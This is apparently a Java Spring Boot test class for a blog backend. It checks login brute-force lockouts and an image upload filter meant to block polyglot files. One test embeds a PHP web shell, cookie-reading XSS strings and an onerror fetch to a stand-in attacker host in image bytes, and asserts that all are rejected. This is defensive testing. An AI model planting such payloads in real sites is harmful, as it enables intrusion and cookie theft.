package com.hayden.blog;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.hayden.blog.dto.LoginRequest;
import com.hayden.blog.security.CaptchaService;
import com.hayden.blog.security.JwtTokenProvider;
import com.hayden.blog.security.LoginAttemptService;
import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@Slf4j
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("h2")
public class ConcurrencyAndPolyglotChallengeTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private LoginAttemptService loginAttemptService;

    @Autowired
    private CaptchaService captchaService;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    private String adminToken;

    @BeforeEach
    void setUp() {
        adminToken = "Bearer " + jwtTokenProvider.generateToken("admin", "ADMIN");
    }

    // ==========================================
    // 1. 并发防爆破原子性与有效性实证测试
    // ==========================================

    @Test
    @DisplayName("对抗实测 1.1：同IP同账号 30 线程高并发错误登录下的计数原子性与 429 锁定生效")
    void testConcurrentLoginBruteForceAtomicity() throws Exception {
        final String testIp = "192.168.100.201";
        final String testUser = "concurrent_victim_1";
        loginAttemptService.reset(testIp, testUser);

        int threadCount = 30;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch startSignal = new CountDownLatch(1);
        CountDownLatch doneSignal = new CountDownLatch(threadCount);

        List<Integer> statusCodes = Collections.synchronizedList(new ArrayList<>());
        AtomicInteger lock429Count = new AtomicInteger(0);

        for (int i = 0; i < threadCount; i++) {
            final int index = i;
            executor.submit(() -> {
                try {
                    startSignal.await(); // 30 线程瞬间齐发
                    LoginRequest req = new LoginRequest();
                    req.setUsername(testUser);
                    req.setPassword("wrong-password-" + index);

                    MvcResult result = mockMvc.perform(post("/api/auth/login")
                                    .header("X-Forwarded-For", testIp)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content(objectMapper.writeValueAsString(req)))
                            .andReturn();

                    int statusCode = result.getResponse().getStatus();
                    statusCodes.add(statusCode);
                    if (statusCode == 429) {
                        lock429Count.incrementAndGet();
                    }
                } catch (Exception e) {
                    log.error("并发请求异常", e);
                } finally {
                    doneSignal.countDown();
                }
            });
        }

        startSignal.countDown(); // 发令枪响
        boolean finished = doneSignal.await(10, TimeUnit.SECONDS);
        executor.shutdown();

        assertTrue(finished, "30 线程并发请求未在 10 秒内全部完成");
        assertEquals(30, statusCodes.size(), "所有并发请求必须全部返回响应");

        // 验证并发后必然触发锁定
        assertTrue(lock429Count.get() > 0, "高并发冲击下必须触发 429 锁定响应");

        // 验证并发风暴平息后，后续任意请求（哪怕密码正确）均被绝对硬性锁定为 HTTP 429
        LoginRequest correctReq = new LoginRequest();
        correctReq.setUsername(testUser);
        correctReq.setPassword("admin123");

        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", testIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(correctReq)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429));
    }

    @Test
    @DisplayName("对抗实测 1.2：分布式 IP 协同爆破同一账号，原子性锁定账号维度 (429)")
    void testDistributedIpBruteForceAccountLockout() throws Exception {
        final String testUser = "distributed_victim_user";
        loginAttemptService.reset(null, testUser);

        int ipCount = 20;
        ExecutorService executor = Executors.newFixedThreadPool(ipCount);
        CountDownLatch startSignal = new CountDownLatch(1);
        CountDownLatch doneSignal = new CountDownLatch(ipCount);

        List<Integer> statuses = Collections.synchronizedList(new ArrayList<>());

        for (int i = 0; i < ipCount; i++) {
            final String ip = "10.200." + (i / 256) + "." + (i % 256 + 1);
            executor.submit(() -> {
                try {
                    startSignal.await();
                    LoginRequest req = new LoginRequest();
                    req.setUsername(testUser);
                    req.setPassword("distributed-wrong-pwd");

                    MvcResult res = mockMvc.perform(post("/api/auth/login")
                                    .header("X-Forwarded-For", ip)
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content(objectMapper.writeValueAsString(req)))
                            .andReturn();
                    statuses.add(res.getResponse().getStatus());
                } catch (Exception e) {
                    log.error("分布式并发异常", e);
                } finally {
                    doneSignal.countDown();
                }
            });
        }

        startSignal.countDown();
        doneSignal.await(10, TimeUnit.SECONDS);
        executor.shutdown();

        // 验证不论从哪个新的无辜 IP 发起针对该账号的登录，均直接触发账号锁定 429
        String freshIp = "172.16.88.99";
        LoginRequest req = new LoginRequest();
        req.setUsername(testUser);
        req.setPassword("any-password");

        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", freshIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("账号已锁定")));
    }

    @Test
    @DisplayName("对抗实测 1.3：单一 IP 喷洒爆破不同账号触发双层防御（3次后验证码阻断400，持续输错5次锁定IP 429）")
    void testSingleIpDistributedUserBruteForceIpLockout() throws Exception {
        final String attackerIp = "198.51.100.99";
        loginAttemptService.reset(attackerIp, null);

        // 1. 第 1 次与第 2 次：401
        for (int i = 1; i <= 2; i++) {
            LoginRequest req = new LoginRequest();
            req.setUsername("user_spray_" + i);
            req.setPassword("spray_pass");

            mockMvc.perform(post("/api/auth/login")
                            .header("X-Forwarded-For", attackerIp)
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(req)))
                    .andExpect(status().isUnauthorized());
        }

        // 2. 第 3 次：进入防刷临界，正常提供错误密码返回 401
        LoginRequest req3 = new LoginRequest();
        req3.setUsername("user_spray_3");
        req3.setPassword("spray_pass");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackerIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req3)))
                .andExpect(status().isUnauthorized());

        // 3. 第 4 次不带验证码：第一层防线（验证码强制挑战）阻断返回 HTTP 400
        LoginRequest req4NoCaptcha = new LoginRequest();
        req4NoCaptcha.setUsername("user_spray_4");
        req4NoCaptcha.setPassword("spray_pass");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackerIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req4NoCaptcha)))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("验证码")));

        // 4. 攻击者即使破解或提供了有效验证码继续爆破，第 4 次与第 5 次输错
        String cKey4 = "spray-key-4";
        captchaService.storeCaptchaForTest(cKey4, "CODE");
        req4NoCaptcha.setCaptchaKey(cKey4);
        req4NoCaptcha.setCaptchaCode("CODE");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackerIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req4NoCaptcha)))
                .andExpect(status().isUnauthorized());

        // 第 5 次：达到 5 次阈值，第二层防线（15分钟硬锁定）触发，返回 429
        String cKey5 = "spray-key-5";
        captchaService.storeCaptchaForTest(cKey5, "CODE");
        LoginRequest req5 = new LoginRequest();
        req5.setUsername("user_spray_5");
        req5.setPassword("spray_pass");
        req5.setCaptchaKey(cKey5);
        req5.setCaptchaCode("CODE");

        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackerIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req5)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429));

        // 5. 第 6 次从该 IP 尝试登录（即便是一个合法的全新账号）：在第一道防线就被 IP 级锁定拦截
        LoginRequest req6 = new LoginRequest();
        req6.setUsername("brand_new_valid_user");
        req6.setPassword("SprayPass123");

        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackerIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req6)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("当前IP密码错误次数过多")));
    }

    @Test
    @DisplayName("对抗实测 1.4：锁定状态下零算力开销防御（100 次并发请求平均响应 < 15ms，避免 BCrypt 算力 DoS）")
    void testPostLockoutZeroCostDefense() throws Exception {
        final String testIp = "203.0.113.55";
        final String testUser = "locked_account_perf";
        loginAttemptService.reset(testIp, testUser);

        // 先触发锁定
        for (int i = 0; i < 5; i++) {
            loginAttemptService.loginFailed(testIp, testUser);
        }

        LoginRequest req = new LoginRequest();
        req.setUsername(testUser);
        req.setPassword("any-password");
        String json = objectMapper.writeValueAsString(req);

        // 预热 5 次
        for (int i = 0; i < 5; i++) {
            mockMvc.perform(post("/api/auth/login")
                    .header("X-Forwarded-For", testIp)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(json));
        }

        long start = System.currentTimeMillis();
        int iterations = 100;
        for (int i = 0; i < iterations; i++) {
            mockMvc.perform(post("/api/auth/login")
                            .header("X-Forwarded-For", testIp)
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(json))
                    .andExpect(status().isTooManyRequests());
        }
        long elapsed = System.currentTimeMillis() - start;
        double avgMs = (double) elapsed / iterations;
        log.info("锁定状态下 100 次拦截耗时: {} ms, 平均单次: {} ms", elapsed, avgMs);

        // BCrypt 单次耗时约为 70~100ms；如果进入了 BCrypt 则 100 次耗时至少 7000ms。
        // 若在第一道防线直接快速拦截，100 次耗时应当远小于 1000ms（单次 < 15ms）。
        assertTrue(avgMs < 20.0, "锁定拦截必须在计算密码前短路返回，平均耗时需小于 20ms，实测: " + avgMs + "ms");
    }

    // ==========================================
    // 2. 文件上传二进制魔数与 Polyglot 渗透测试
    // ==========================================

    @Test
    @DisplayName("对抗实测 2.1：合规 PNG, JPEG, WEBP, GIF 图片 100% 正常放行 (HTTP 200)")
    void testValidImageUploadsPassCleanly() throws Exception {
        // 1. 合规 PNG (8-byte PNG signature: 89 50 4E 47 0D 0A 1A 0A)
        byte[] validPng = new byte[]{
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89
        };
        MockMultipartFile pngFile = new MockMultipartFile("file", "valid_test.png", "image/png", validPng);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(pngFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200))
                .andExpect(jsonPath("$.data.url").isNotEmpty());

        // 2. 合规 JPEG (FF D8 FF E0 ...)
        byte[] validJpg = new byte[]{
                (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0,
                0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
                0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                (byte) 0xFF, (byte) 0xD9
        };
        MockMultipartFile jpgFile = new MockMultipartFile("file", "valid_test.jpg", "image/jpeg", validJpg);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(jpgFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200));

        // 3. 合规 GIF (GIF89a: 47 49 46 38 39 61)
        byte[] validGif = new byte[]{
                0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
                0x01, 0x00, 0x01, 0x00, (byte) 0x80, 0x00, 0x00,
                (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x00, 0x00, 0x00,
                0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3B
        };
        MockMultipartFile gifFile = new MockMultipartFile("file", "valid_test.gif", "image/gif", validGif);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(gifFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200));

        // 4. 合规 WEBP (RIFF....WEBP: 52 49 46 46 [4 bytes size] 57 45 42 50)
        byte[] validWebp = new byte[]{
                0x52, 0x49, 0x46, 0x46, // RIFF
                0x1A, 0x00, 0x00, 0x00, // Size: 26
                0x57, 0x45, 0x42, 0x50, // WEBP
                0x56, 0x50, 0x38, 0x20, // VP8 (space)
                0x0E, 0x00, 0x00, 0x00,
                0x30, 0x01, 0x00, (byte) 0x9D, 0x01, 0x2A, 0x01, 0x00, 0x01, 0x00
        };
        MockMultipartFile webpFile = new MockMultipartFile("file", "valid_test.webp", "image/webp", validWebp);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(webpFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200));
    }

    @Test
    @DisplayName("对抗实测 2.2：Polyglot 混淆攻击与脚本注入精准识别拦截 (HTTP 400)")
    void testPolyglotAndScriptInjectionRejected() throws Exception {
        // Attack 1: GIF89a 开头混淆 + 嵌入 <script>alert(1)</script> 跨站脚本
        byte[] gifPolyglot = ("GIF89a/* <script>alert('xss')</script> */\n" +
                "<?php phpinfo(); ?>").getBytes(StandardCharsets.UTF_8);
        MockMultipartFile gifScript = new MockMultipartFile("file", "polyglot_exploit.gif", "image/gif", gifPolyglot);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(gifScript)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("恶意载荷")));

        // Attack 2: PNG 头 8 字节合法签名 + 嵌入 SVG/XSS 载荷
        byte[] pngHeader = new byte[]{(byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};
        byte[] svgPayload = "<svg/onload=alert(document.cookie)>".getBytes(StandardCharsets.UTF_8);
        byte[] pngPolyglot = new byte[pngHeader.length + svgPayload.length];
        System.arraycopy(pngHeader, 0, pngPolyglot, 0, pngHeader.length);
        System.arraycopy(svgPayload, 0, pngPolyglot, pngHeader.length, svgPayload.length);

        MockMultipartFile pngScript = new MockMultipartFile("file", "avatar_polyglot.png", "image/png", pngPolyglot);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(pngScript)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("恶意载荷")));

        // Attack 3: JPEG 头合法魔数 + 嵌入 PHP WebShell 载荷
        byte[] jpgHeader = new byte[]{(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46};
        byte[] phpPayload = "<?php @eval($_POST['cmd']); ?>".getBytes(StandardCharsets.UTF_8);
        byte[] jpgPolyglot = new byte[jpgHeader.length + phpPayload.length];
        System.arraycopy(jpgHeader, 0, jpgPolyglot, 0, jpgHeader.length);
        System.arraycopy(phpPayload, 0, jpgPolyglot, jpgHeader.length, phpPayload.length);

        MockMultipartFile jpgScript = new MockMultipartFile("file", "photo_shell.jpg", "image/jpeg", jpgPolyglot);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(jpgScript)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("恶意载荷")));

        // Attack 4: WEBP 头合法 + 嵌入 javascript: 协议注入
        byte[] webpHeader = new byte[]{
                0x52, 0x49, 0x46, 0x46, 0x20, 0x00, 0x00, 0x00,
                0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20
        };
        byte[] jsPayload = "<a href=\"javascript:alert(1)\">click me</a>".getBytes(StandardCharsets.UTF_8);
        byte[] webpPolyglot = new byte[webpHeader.length + jsPayload.length];
        System.arraycopy(webpHeader, 0, webpPolyglot, 0, webpHeader.length);
        System.arraycopy(jsPayload, 0, webpPolyglot, webpHeader.length, jsPayload.length);

        MockMultipartFile webpScript = new MockMultipartFile("file", "gallery.webp", "image/webp", webpPolyglot);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(webpScript)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));

        // Attack 5: PNG 头合法 + 包含 onerror= 恶意事件属性
        byte[] onerrorPayload = "<img src=x onerror=fetch('http://attacker.com')>".getBytes(StandardCharsets.UTF_8);
        byte[] pngOnerror = new byte[pngHeader.length + onerrorPayload.length];
        System.arraycopy(pngHeader, 0, pngOnerror, 0, pngHeader.length);
        System.arraycopy(onerrorPayload, 0, pngOnerror, pngHeader.length, onerrorPayload.length);

        MockMultipartFile onerrorFile = new MockMultipartFile("file", "onerror_exploit.png", "image/png", pngOnerror);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(onerrorFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));
    }

    @Test
    @DisplayName("对抗实测 2.3：非白名单后缀及微型残缺文件直接拒绝 (HTTP 400)")
    void testExtensionAndTruncatedFileRejected() throws Exception {
        // 1. 常见危险脚本扩展名
        String[] illegalExts = {"test.html", "exploit.htm", "evil.svg", "backdoor.php", "script.js", "worm.sh", "cmd.bat"};
        for (String filename : illegalExts) {
            MockMultipartFile file = new MockMultipartFile("file", filename, "application/octet-stream", "dummy content".getBytes());
            mockMvc.perform(multipart("/api/media/upload")
                            .file(file)
                            .header("Authorization", adminToken))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.code").value(400));
        }

        // 2. 伪装成 png 但仅 2 字节（无法校验魔数）
        MockMultipartFile tinyFile = new MockMultipartFile("file", "tiny.png", "image/png", new byte[]{0x01, 0x02});
        mockMvc.perform(multipart("/api/media/upload")
                        .file(tinyFile)
                        .header("Authorization", adminToken))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.code").value(400));

        // 3. 空文件
        MockMultipartFile emptyFile = new MockMultipartFile("file", "empty.png", "image/png", new byte[0]);
        mockMvc.perform(multipart("/api/media/upload")
                        .file(emptyFile)
                        .header("Authorization", adminToken))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.code").value(400));
    }
}
